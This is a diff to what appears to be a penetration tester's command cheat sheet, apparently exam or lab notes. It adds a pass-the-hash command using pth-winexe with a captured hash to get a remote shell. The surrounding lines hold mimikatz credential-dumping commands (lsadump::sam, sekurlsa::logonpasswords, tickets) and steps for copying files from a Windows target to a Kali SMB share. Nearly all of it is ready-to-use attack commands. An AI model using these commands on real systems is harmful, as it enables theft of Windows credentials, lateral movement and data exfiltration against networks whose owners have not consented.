@@ -166,6 +166,8 @@ tcpdump -i tun0 icmp -v   # listen for icmp ping to tun0 interface
 privilege::debug
 token::elevate
 lsadump::sam
+------------------Pass The Hash-------------------
+pth-winexe -U [USERNAME]%[HASH] //[IP_ADDR] cmd		# https://github.com/byt3bl33d3r/pth-toolkit
 -----------------AD Enumeration-------------------
 sekurlsa::logonpasswords
 sekurlsa::tickets
@@ -197,6 +199,9 @@ New-PSDrive -NAME [USER] -PSProvider FileSystem -Credential $cred -Root \\[KALI 
 Method 2:
 on Kali : smbserver.py test ./share
 smbserver.py [share_name] [folder_path]
+# If failed, edit the smb conf file on kali:
+# /etc/samba/smb.conf
+# min protocol = SMB2
 
 on Windows: copy proof.txt \\192.168.119.160\test\proof.txt
 copy [file to transfer] \\[linux ip]\[share_name]\[output file name]
